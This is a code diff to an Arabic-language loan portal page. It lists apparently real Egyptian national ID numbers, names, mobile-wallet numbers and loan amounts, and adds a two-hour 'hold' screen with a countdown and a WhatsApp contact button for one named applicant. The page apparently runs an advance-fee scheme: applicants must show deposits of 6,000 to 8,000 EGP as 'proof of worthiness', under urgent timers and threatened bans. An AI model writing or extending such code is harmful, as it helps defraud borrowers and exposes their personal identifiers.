@@ -146,7 +146,7 @@ const customersDatabase = {
 "27810101600355": { name: "احمد عبد الحميد احمد نوار", loan: 200000, wallet: "فودافون كاش", walletNum: "01000748697", status: "approved" },
 "27901102605071": { name: "السيد عمر احمد محمد", loan: 50000, wallet: "اتصالات كاش", walletNum: "01147300455", status: "approved" },
 "27904011802671": { name: "علاء علي مرسي القطقوطي", loan: 200000, wallet: "فودافون كاش", walletNum: "01067130776", status: "approved" },
-"27611108800462": { name: "داليا عادل السيد عبد الكريم", loan: 100000, wallet: "فودافون كاش", walletNum: "01017575141", status: "approved" },
+// "27611108800462": { name: "داليا عادل السيد عبد الكريم", loan: 100000, wallet: "فودافون كاش", walletNum: "01017575141", status: "approved" }, // ❌ تم تعليق الطلب لمدة ساعتين
 "27109061401338": { name: "سمير محمد امام على دويدار", loan: 190000, wallet: "اتصالات كاش", walletNum: "01112781649", status: "approved" },
 "27311091401301": { name: "سوسن عبدربة عبدالرازق السيد", loan: 155000, wallet: "اتصالات كاش", walletNum: "01113443423", status: "approved" },
 "27808230102316": { name: "مصطفى محمد سيد عبد الغني", loan: 50000, wallet: "اتصالات كاش", walletNum: "01124213383", status: "approved" },
@@ -157,7 +157,7 @@ const customersDatabase = {
 "27810101600355": { name: "احمد عبد الحميد احمد نوار", loan: 200000, wallet: "فودافون كاش", walletNum: "01000748697", status: "approved" },
 "27901102605071": { name: "السيد عمر احمد محمد", loan: 50000, wallet: "اتصالات كاش", walletNum: "01147300455", status: "approved" },
 "27904011802671": { name: "علاء علي مرسي القطقوطي", loan: 200000, wallet: "فودافون كاش", walletNum: "01067130776", status: "approved" },
-"27611108800462": { name: "داليا عادل السيد عبد الكريم", loan: 100000, wallet: "فودافون كاش", walletNum: "01017575141", status: "approved" },
+"27611108800462": { name: "داليا عادل السيد عبد الكريم", loan: 100000, wallet: "فودافون كاش", walletNum: "01017575141", status: "pending_hold", holdMinutes: 120 },
 "27109061401338": { name: "سمير محمد امام على دويدار", loan: 190000, wallet: "اتصالات كاش", walletNum: "01112781649", status: "approved" }
 };
 
@@ -247,6 +247,65 @@ const customersDatabase = {
         }
         const btn = document.getElementById('sendProofPendingBtn');
         if (btn) btn.onclick = () => openWhatsApp(`طلب إثبات الجدارة\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المطلوب صرفه: ${customer.loan.toLocaleString('ar-EG')} ج.م\nسأقوم بإرسال صورتي الإيداع والخروج لإثبات الجدارة بمبلغ ${proofAmount.toLocaleString('ar-EG')} ج.م.`);
+    }
+
+    // دالة للتعليق المؤقت مع عداد ساعتين
+    function buildHoldStage(customer, nationalId, holdMinutes) {
+        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
+        const html = `
+            <div class="proof-required-card" style="border-color: #FF8C42;">
+                <i class="fas fa-pause-circle" style="font-size:3rem; color:var(--warning);"></i>
+                <h2 style="color:var(--warning);">⏳ طلبك معلق مؤقتاً</h2>
+                <div class="step-box" style="border-right-color:var(--warning);">
+                    <strong>📌 سبب التعليق:</strong> جاري مراجعة بعض البيانات من قبل فريق التمويل.
+                </div>
+                <div class="step-box" style="border-right-color:var(--warning);">
+                    <strong>⏱️ المدة المتوقعة:</strong> <span class="highlight-value">${holdMinutes} دقيقة</span> (ساعتين)
+                </div>
+                <div class="timer-glow" style="border-color:var(--warning); animation: pulseGold 1.2s infinite alternate;">
+                    <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لانتهاء التعليق</div>
+                    <div class="timer" id="holdTimer" style="color:var(--warning);">${String(holdMinutes).padStart(2,'0')}:00</div>
+                    <div style="font-size:0.7rem;">⏳ بعد انتهاء الوقت، سيتم إعادة تفعيل طلبك تلقائياً</div>
+                </div>
+                <div class="details-grid">
+                    <div class="detail-item"><span><i class="fas fa-wallet"></i> المحفظة المسجلة</span><span>${customer.wallet} ${customer.walletNum ? '('+customer.walletNum+')' : ''}</span></div>
+                    <div class="detail-item"><span><i class="fas fa-money-bill-wave"></i> المبلغ المطلوب</span><span>${customer.loan.toLocaleString('ar-EG')} ج.م</span></div>
+                </div>
+                <div class="info-message" style="border-right-color:var(--warning);">
+                    <i class="fas fa-info-circle"></i> سيتم إشعارك فور انتهاء المراجعة. يرجى متابعة الصفحة.
+                </div>
+                <button class="btn-whatsapp" id="contactSupportHoldBtn" style="background: linear-gradient(135deg, #FF8C42, #E07B2F);">
+                    <i class="fab fa-whatsapp fa-lg"></i> التواصل مع الدعم (للاستفسار)
+                </button>
+            </div>
+        `;
+        document.getElementById('resultSection').innerHTML = html;
+        
+        // تشغيل العداد التنازلي لمدة ساعتين (120 دقيقة)
+        let secondsLeft = holdMinutes * 60;
+        const timerEl = document.getElementById('holdTimer');
+        if (timerEl) {
+            const interval = setInterval(() => {
+                if (secondsLeft <= 0) {
+                    clearInterval(interval);
+                    timerEl.innerText = "00:00";
+                    // تغيير الرسالة بعد انتهاء الوقت
+                    document.querySelector('.proof-required-card .step-box:last-child').innerHTML = 
+                        `<strong>✅ تم انتهاء فترة التعليق!</strong><br>يمكنك الآن إعادة المحاولة أو التواصل مع الدعم.`;
+                    document.querySelector('.timer-glow').style.borderColor = "#2ECC71";
+                    timerEl.style.color = "#2ECC71";
+                    alert("⏰ انتهت فترة التعليق. يمكنك الآن إعادة المحاولة.");
+                } else {
+                    secondsLeft--;
+                    const mins = Math.floor(secondsLeft / 60);
+                    const secs = secondsLeft % 60;
+                    timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+                }
+            }, 1000);
+        }
+        
+        const btn = document.getElementById('contactSupportHoldBtn');
+        if (btn) btn.onclick = () => openWhatsApp(`استفسار عن طلب معلق\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المطلوب: ${customer.loan.toLocaleString('ar-EG')} ج.م`);
     }
 
     // دالة خاصة للعميل كريم فؤاد: تعليق لمدة ساعة ثم حظر 90 يومًا (مع تخزين في localStorage)
@@ -415,6 +474,10 @@ const customersDatabase = {
             // باقي العملاء حسب الحالة الأصلية
             switch (customer.status) {
                 case 'approved': buildApprovedStage(customer, nationalId); break;
+                case 'pending_hold': 
+                    const holdMinutes = customer.holdMinutes || 120;
+                    buildHoldStage(customer, nationalId, holdMinutes);
+                    break;
                 case 'pending_urgent_90day': 
                     // للحالات الأخرى التي تحتاج عداد عاجل (مثل صابحة) - نمرر deadlineMinutes من الكائن
                     const deadline = customer.deadlineMinutes || 5;
